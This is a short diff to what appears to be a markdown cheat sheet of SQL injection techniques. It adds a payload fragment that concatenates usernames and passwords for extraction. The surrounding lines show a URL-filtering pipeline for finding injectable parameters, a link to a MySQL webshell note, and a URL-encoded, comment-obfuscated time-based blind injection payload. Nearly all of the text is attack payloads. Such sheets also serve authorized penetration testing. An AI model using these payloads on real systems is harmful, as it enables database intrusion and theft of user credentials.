@@ -147,8 +147,12 @@ cat url.txt|gf sqli | tee sql.txt
 >benefits for upload
 -[mysql-webshell](https://github.com/stevemcilwain/secrets/blob/master/mysql-webshell.md)
 >
->
-> 
+
+>sql username, password
+```
+concat(username,0x3a, password)
+
+```
 > error reuslt
 ```
 1234'%2F%2A%2A%2FAnd%2F%2A%2A%2F%0Asleep(5)
